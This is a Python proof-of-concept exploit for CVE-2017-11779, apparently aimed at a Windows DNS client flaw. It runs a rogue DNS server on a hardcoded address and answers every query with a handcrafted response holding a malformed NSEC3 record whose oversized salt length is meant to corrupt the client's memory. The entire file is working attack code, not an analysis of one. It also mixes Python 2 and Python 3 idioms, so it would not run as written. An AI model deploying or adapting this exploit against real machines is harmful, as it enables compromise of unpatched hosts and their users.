import socketserver
import sys

class Handler(socketserver.BaseRequestHandler):
  def handle(self):
    socket = self.request[1]
    data = self.request[0].strip()
    response = data[:2]
    response += "81a30001000000060001".decode("hex")
    response += self.get_question(data)
    response += "20564c513234375149385031545433413843474d4437474c464e44544947534455c01100320001000000b3".decode("hex")
    response += "0033".decode("hex")  # Data length
    response += "01000014".decode("hex")
    response += "ff".decode("hex")    # Salt length
    response += "80637d8af055b5eeca2a621edaaa3c5e".decode("hex")
    response += "14".decode("hex")    # Hash length
    response += "3d8a3eb61a9dfa951a42d7779c1f150685a01947000762018008000290c186002e0001000000b3011d00320a03000000b459fd6ea859d5d398794f057373686670036e6574000601e89304161294b0a21f3828a4c137c675cabaddeff8837fad9c553895b7bf9e2b21fc789786d1f3fb734e519a4662d453ea41fbcca87f9657608017a602639cc636a249d94f529bcc504e1823d0d59e446ed67b1e7a93ebd5f07db21e4f8e29150ff2454b34f5716be5b712640500e672b0eb81c5f03d6c4ea42effd282e842df4321b45a4c9f678c7996cd033b29ce1a13943856010eed3a6bd41880713be77e5459ded91199ec4b2b70543c6f00e20dd2cb1642424fb7be33731b1a2707ac8494d38638cbc1862bacad4824d8644aee4c835178ba4339524edf8e32cf9e63da0d6309c6a8187e6c7c181a99445a4cb799cab602359c22456a7db3d61809".decode("hex")
    response += "0000290200000080000000".decode("hex")
    print(response.encode("hex"))
    socket.sendto(response, self.client_address)

  def get_question(self, data):
    start_idx = 12
    end_idx = start_idx
    num_questions = (ord(data[4]) << 8) | ord(data[5])

    while num_questions > 0:
      while data[end_idx] != '\0':
        end_idx += ord(data[end_idx]) + 1
      end_idx += 5
      num_questions -= 1
    return data[start_idx:end_idx]

if __name__ == '__main__':
  server = socketserver.ThreadingUDPServer(('10.10.10.163', 53), Handler)
  print('CVE-2017-11779 PoC Started.')
  try:
    server.serve_forever()
  except KeyboardInterrupt:
    server.shutdown()
    sys.exit(0)